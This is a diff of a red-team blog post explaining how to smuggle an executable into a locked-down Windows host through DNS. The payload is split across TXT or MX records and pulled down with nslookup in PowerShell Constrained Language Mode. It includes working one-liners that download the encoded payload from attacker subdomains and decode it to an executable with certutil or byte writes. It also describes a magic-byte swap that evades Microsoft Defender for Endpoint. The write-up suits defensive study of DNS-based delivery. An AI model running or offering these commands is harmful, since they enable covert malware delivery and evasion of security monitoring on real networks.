@@ -60,7 +60,7 @@ Before we get started we have to talk briefly about setting up DNS records to po
 
 ![image](https://user-images.githubusercontent.com/91164728/160316942-fc26fcbe-e217-42f8-a768-b420cd02d316.png)
 
-This means that any queries made for "dns.edu....com" will be directed at "ns1.edu....com" which is assigned the IP 3..86.  On that IP we will set up a DNS server to serve our records. This will come around again later. 
+This means that any queries made for "dns.edu....com" will be directed to "ns1.edu....com" which is assigned the IP 3..86.  On that IP we will set up a DNS server to serve our records. This will come around again later. 
 
 ## Finding a client side tool
 
@@ -82,7 +82,7 @@ However if I open a new powershell window and immediately put it into CLM and th
 
 ![image](https://user-images.githubusercontent.com/91164728/160314638-3258609d-777d-4ae6-83e1-d04fcb6667f7.png)
 
-It appears that if a module has been loaded before hand it is able to run once CLM is enforced, however CLM will prevent it from loading if it has not already done so. Thinking forward to a target environment where CLM is enforced for users by default (and with no knowledge if there are certain modules pre-loaded or if DnsClient is one of them), I chose at this point to leave Resolve-DnsName behind and turn back to good old Nslookup.exe.
+It appears that if a module has been loaded beforehand it is able to run after CLM is enforced, however CLM will prevent it from loading if it has not already done so. Thinking forward to a target environment where CLM is enforced for users by default (and with no knowledge if there are certain modules pre-loaded or if DnsClient is one of them), I chose at this point to leave Resolve-DnsName behind and turn back to good old Nslookup.exe.
 
 ![image](https://user-images.githubusercontent.com/91164728/160315058-87cd9ec6-4c65-4a5e-8700-f4d8c624d372.png)
 
@@ -92,17 +92,17 @@ Nslookup will return much the same information as our Resolve-DnsName query, we 
 
 ## Turning an executable into DNS records?
 
-Ok so we have a means by which to make DNS queries on the victim computer.  How can we provide our payload in a way that Nslookup could download?
+Ok so we have a means by which to make DNS queries on the victim computer.  How can we provide our payload in a format that Nslookup can retrieve?
 
-Executables are of course binary files which means they aren't human readable.  As a result the data must be transformed into something that is human readable that we could stick into DNS records and that a tool like Nslookup could recover. There are ample encoding options available to us, but the major consideration is what can victim box decode using only native windows tools and capabilities available in CLM?  Base64 is the obvious and often used answer.
+Executables are of course binary files which means they aren't human readable.  As a result the data must be transformed into something that we can stick into DNS records and that a tool like Nslookup can recover. There are ample encoding options available to us, but the major consideration is what can the victim box decode using only native windows tools and capabilities available in CLM?  Base64 is the obvious and often reached answer.
 
-Using Base64 we turn our executable into a giant human readable string which can then be broken up into many DNS records and recovered using Nslookup.  On the client side the well known LOLBAS certutil.exe can be used to Base64 decode the compiled DNS records back to binary format.  
+Using Base64 we turn our executable into a giant human readable string which can then be broken up into many DNS records and recovered using Nslookup.  On the client side the well known LOLBAS certutil.exe can be used to Base64 decode the aggregate DNS records back to binary format.  
 
-This requires we talk a bit more about DNS record types.  Each record type stores certain information in a certain format. A records for example store and return an IPV4 address (111.111.111.111).  AAAA records return an IPV6 address, MX and NS records return domain names, and TXT records can return 255 character long strings.  As was previously mentioned, due to the length of record and case-sensitivity, TXT records have been the obvious choice for attackers as fewer will be required and they are compatible with encoding like Base64.  
+This requires we talk a bit more about DNS record types.  Each record type stores certain information in a particular format. A records for example store and return an IPV4 address (111.111.111.111).  AAAA records return an IPV6 address, MX and NS records return domain names, and TXT records can return 255 character long strings.  As was previously mentioned, due to the length of record and case-sensitivity, TXT records have been the obvious choice for attackers as fewer will be required and they are compatible with encoding like Base64.  
 
 Lets see what this looks like.
 
-On our Kali vm we can take our executable and base64 it.  Note the use of the -w 0 switch which will remove all newlines so we are left with a single line of Base64 text:
+On our Kali vm we can take our executable and Base64 it.  Note the use of the -w 0 switch which will remove all newlines so we are left with a single line of Base64 text:
 
 ![image](https://user-images.githubusercontent.com/91164728/160316299-beda425a-a5d3-4467-9d43-6f5bb9bf2b07.png)
 
@@ -116,15 +116,15 @@ There are a few things I learned during this that I will quickly summarize here 
 
   **1.** When multiple records return for a single DNS query, there is no guarantee that they will be returned in "order". This is critical for our purposes, as we need to reassemble a file from all of the TXT records and if they are out of order it won't work.
   
-  **2.** Duplicate records aren't returned for a query.  For example, in our zonefile if we had 3 TXT records and 2 of them contained the same information, when we queried TXT records for that domain only 2 records would return as only the unique records are returned.  The not-in-order problem notwithstanding, if we had for example large sections of "AAAAA" (as we do in the Bas64'd payload) that we needed to fill multiple TXT records with, when we queried our domain for TXT records only one of the "A" filled TXT records would return even if there are several of them.
+  **2.** Duplicate records aren't returned for a query.  For example, in our zonefile if we had 3 TXT records and 2 of them contained the same information, when we queried TXT records for that domain only 2 records would return as only the unique records are returned.  The not-in-order problem notwithstanding, if we had for example large sections of "AAAAA" (as we do in the Base64'd payload) that we needed to fill multiple TXT records with, when we query our domain for TXT records only one of the "A" filled TXT records will return even if there are several of them in the zonefile.
   
-With these points in mind we must ensure that only a single TXT record is returned for each DNS query.  Enter subdomains.  Just as we registered "dns.edu...com" as a subdomain of "edu....com", we can provide records for further subdomains (e.g. 1.dns.edu....com).  We can create as many subdomains as needed to in order to serve all our TXT records.
+With these points in mind we must ensure that only a single TXT record is returned for each DNS query.  Enter subdomains.  Just as we registered "dns.edu...com" as a subdomain of "edu....com", we can provide records for further subdomains (e.g. 1.dns.edu....com).  We can create as many subdomains as needed to in order to serve all of our TXT records.
 
 Let look at our Base64'd payload:
 
 ![image](https://user-images.githubusercontent.com/91164728/160318505-d7b98905-e475-4ba2-94ae-492bc0bd3c63.png)
 
-As previously mentioned we can stuff 255 characters into each TXT record.  Dividing 413696/255 yields 1,623 after rounding up.  That is a lot of TXT records (and by proxy a lot of subdomains). It is a starting point however.
+As previously mentioned we can stuff 255 characters into each TXT record.  Dividing 413,696/255 yields 1,623 after rounding up.  That is a lot of TXT records (and by proxy a lot of subdomains). It is a starting point however.
 
 I wrote a Python3 script to ingest the Base64'd payload and create a zonefile:
 
@@ -142,7 +142,7 @@ Now that our zonefile is created we will need to copy it to our DNS server and t
 
 ![image](https://user-images.githubusercontent.com/91164728/160324503-beaaca28-df15-4f33-b107-3c848abee162.png)
 
-This shows that I am accepting queries for dns.edu....com on port 53.  In the Corefile I have specified the zonefile created in the previous step to serve records from. To test that our records work we will run nslookup for TXT records belonging to 1.dns....com:
+This shows that I am accepting queries for dns.edu....com on port 53.  In the Corefile I have specified the zonefile created in the previous step to serve records from. To test that our records work we will run nslookup for TXT records belonging to 1.dns.edu....com:
 
 ![image](https://user-images.githubusercontent.com/91164728/160323616-d5522549-f00a-4deb-9f51-c11d88c0ce29.png)
 
@@ -150,7 +150,7 @@ There is our TXT record!
 
 ## Attack!
 
-We now need to run nslookup... 1623 times.  Less than ideal, but it's what we will do for now.  We will use this powershell one liner in order to run nslookup for each subdomain and then select only the TXT record ($temp[5]) and then build $results as we go.  $results is then written to ./temp.txt, and finally certutil is used to decode temp.txt to custombeacon.exe.
+We now need to run nslookup... 1623 times.  Less than ideal, but it's what we will do for now.  We will use this powershell one-liner in order to run nslookup for each subdomain and then select only the TXT record ($temp[5]) and then build $results as we go.  $results is then written to ./temp.txt, and finally certutil is used to decode temp.txt to custombeacon.exe.
 
 ```powershell
 $results="";for($num = 1; $num -le 1623 ; $num++){$temp = nslookup -type=TXT "$num.dns.edu....com" 2> $null;$temp = $temp[5].replace("`t","").replace("`"","");$results = $results + $temp};$results > ./temp.txt;certutil -decode ./temp.txt ./custombeacon.exe
@@ -205,7 +205,7 @@ I decided to try and use MX records instead of TXT records to smuggle the payloa
 ```
 Since MX records return a domain name I should be able to cram quite a bit of data in each octet.  After some testing I decided to shorten each record a bit and only put 50 characters in each octet for a total of 200 per MX record.
 
-There is however a problem.  When it comes to DNS records, only TXT and SPF (a type of TXT record) records are case-sensitive.  Our encoding language, Base64, is case-sensitive.  I spent a couple hours trouble shooting this until I figured it out, but bottom line if we are going to use Base64 we can't use MX records as our nslookup will always return the records in lowercase letters which breaks our encoding.  
+There is however a problem.  When it comes to DNS records, only TXT and SPF (a type of TXT record) records are case-sensitive.  Our encoding language, Base64, is case-sensitive.  I spent a couple hours trouble shooting this until I figured it out, but bottom line if we are going to use Base64 we can't use MX records as our Nslookup will always return the records in lowercase letters which breaks our encoding.  
 
 We are forced to either find another record type that is case-sensitive and compatible with Base64, or we must find a different encoding language that Windows/powershell in CLM is natively able to decode.  
 
@@ -222,7 +222,7 @@ $hex = Get-Content -Path "C:\blah\exe-bank.txt" -Raw
 
 With a slight modification to the above (changing [System.IO.File]... to $bytes | set-content....) this should work for our purposes.
 
-MX records also have a "preference" value; this is essentially an ordering of priority when it comes to which MX server should be used for a domain.  This can been seen in the earlier example of a zonefile as the "10 20 and 30" values preceding the domain names for the MX records.  We can use this preference value to our advantage by including several MX records per subdomain and ensuring we have our data in the proper order by sorting by the preference value. This will allow us to drastically cut down on the number of times that we call Nslookup compared to when pulled a single record per subdomain with TXT records.
+MX records also have a "preference" value; this is essentially an ordering of priority when it comes to which MX server should be used for a domain.  This can been seen in the earlier example of a zonefile as the "10 20 and 30" values preceding the domain names for the MX records.  We can use this preference value to our advantage by including several MX records per subdomain and ensuring we have our data in the proper order by sorting by the preference value. This will allow us to drastically cut down on the number of times that we call Nslookup compared to when we pulled a single record per subdomain with TXT records.
 
 ![image](https://user-images.githubusercontent.com/91164728/160333792-701081dc-8a03-4207-84ab-501aa145cd3a.png)
 
@@ -284,7 +284,7 @@ We do get one alert for "SuspiciousFileDrop" behavior however it resolved with "
 
 ## Just one step to the left...
 
-MDE didn't like that powershell wrote our payload to disk.  It's understandable; bottom line nslookup pulled an unkown executable from the internet and saved it to disk. How can we mitigate this?
+MDE didn't like that powershell wrote our payload to disk.  It's understandable; bottom line Nslookup pulled an unknown executable from the internet and saved it to disk. How can we mitigate this?
 
 I decided to revisit the magic bytes of the payload. My working theory was that if i changed the magic bytes of the payload to those of say a .txt file and wrote that to disk, then read that file into a new variable and changed the magic bytes back to MZ(executable) and then wrote that back to disk, I might fool MDE because the I/O operation leading to the functional executable landing on disk now originates from a .txt file that already existed on disk as opposed to data pulled from the internet. 
 
@@ -382,7 +382,7 @@ I started out by combining the python scripts that turned our executable into he
 
 ## Reliability
 
-In order to increase reliability of the attack I spent some time working with how the python script creates MX records. The major problem point was the last MX record; this cointains the remainder of the payload, as every other record is filled with 200 characters.  Depending on how much remainder there is, we might end up with one, two, three, or four octects partially or completely filled.  I found that nslookup wouldn't pull records if there were too many trailing "."'s, as was the case with our simple python script earlier if less than four octects were being used by the last MX record (e.g. record might be "0000000000000000000000.000000..").  New logic was implemented and tested to ensure that regardless of payload size or the amount of data in the last MX record it would be formatted properly and function as expected. 
+In order to increase reliability of the attack I spent some time working with how the python script creates MX records. The major problem point was the last MX record; this contains the remainder of the payload, as every other record is filled with 200 characters.  Depending on how much data is left for this record, we might end up with one, two, three, or four octects partially or completely filled.  I found that nslookup wouldn't pull records if there were too many trailing "."'s, as was the case with our simple python script earlier if less than four octects were being used by the last MX record (e.g. record might be "0000000000000000000000.000000..").  New logic was implemented and tested to ensure that regardless of payload size or the amount of data in the last MX record it would be formatted properly and function as expected. 
 
 The implementation of the powershell one-liner in the python script is another step towards reliability, as it ensures you are provided with the correct number of iterations of nslookup as well as the same domain name specified in the zonefile.
 
@@ -402,13 +402,13 @@ These savings come from a few places:
 
 I'm sure there is more that could be done, but I am far from proficient in powershell.
 
-The improved powershell one-liner is:
+The final, improved powershell one-liner which restores the MZ magic bytes and deletes the temporary .txt file is:
 
 ```powershell
 $o="";for($a = 1; $a -le <NUMBER_OF_SUBDOMAINS>; $a ++){$b = nslookup -type=MX "$a.<YOUR_DOMAIN_HERE>" 2> $null;$c = @($null)*($b.count - 3);for($i = 3; $i -le $b.count - 1; $i++){$d = ($b[$i] | sls -patt '(?<=\=\s)((\d|\w){1,50}\.?){1,4}' -a).matches.Value;$c[$d[0]/10 - 1] = $d[1].replace(".","")};$c.foreach({$o = $o + $_})};[byte[]]$e = ($o -split '(.{2})' -ne '' -replace '^', '0X');$f = ".\a.txt";$e | sc -en byte $f;[byte[]]$g = gc $f -en byte -raw;$g[0x00] = 0x4D;$g[0x01] = 0x5A;$g | sc .\pay.exe -enc byte;ri $f
 ```
 # Closing thoughts
 
-Using DNS to infiltrate a payload can be an attractive option in highly restrictive environments where normal methods involving HTTP/S and or more conventional methods may not be viable.  In such an environment the next hurdle is likely to be actually executing your payload- Application Whitelisting bypasses is a topic I will likely spend some time diving into in the future.
+Using DNS to infiltrate a payload can be an attractive option in highly restrictive environments where normal methods involving HTTP/S and or more conventional methods may not be viable.  In such an environment the next hurdle is likely to be actually executing your payload- bypassing Application Whitelisting is a topic I will likely spend some time diving into in the future.
 
-Thank you to those who stuck with me until the end.  It was a busy few days as I explored and developed this topic and I certainly learned some things as I hope you have.  
+Thank you to those who stuck with me until the end.  It was a busy few days as I explored and developed this topic and I certainly learned some things as I hope you have as well.
